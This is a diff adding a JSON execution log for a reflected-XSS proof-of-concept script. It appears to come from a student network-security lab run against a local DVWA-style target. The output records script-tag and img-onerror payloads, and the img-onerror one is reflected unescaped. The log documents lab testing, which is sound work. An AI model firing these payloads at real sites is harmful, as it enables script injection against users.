@@ -1,0 +1,28 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\XSS-003__1.py",
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--cookie",
+    "PHPSESSID=<redacted>; security=<level>"
+  ],
+  "started_at": "2026-10-20T14:43:24+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.202,
+  "stdout": "payload='XSS003_PLAIN_MARKER'\r\nstatus=200 final_url=http://127.0.0.1:9080/vulnerabilities/xss_r/?name=XSS003_PLAIN_MARKER\r\nreflected_raw=True\r\nlt_present=True script_tag_present=True img_tag_present=True\r\ngreeting='XSS003_PLAIN_MARKER'\r\n------------------------------------------------------------\r\npayload=\"<script>alert('XSS003')</script>\"\r\nstatus=200 final_url=http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS003%27%29%3C%2Fscript%3E\r\nreflected_raw=False\r\nlt_present=True script_tag_present=True img_tag_present=True\r\ngreeting='>'\r\n------------------------------------------------------------\r\npayload=\"<img src=x onerror=alert('XSS003')>\"\r\nstatus=200 final_url=http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS003%27%29%3E\r\nreflected_raw=True\r\nlt_present=True script_tag_present=True img_tag_present=True\r\ngreeting=\"<img src=x onerror=alert('XSS003')>\"\r\n------------------------------------------------------------\r\n",
+  "stderr": "",
+  "cohort": "v1",
+  "stem": "XSS-003__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\XSS-003__1.py",
+  "args_redacted": [
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--cookie",
+    "PHPSESSID=<redacted>; security=<level>"
+  ]
+}
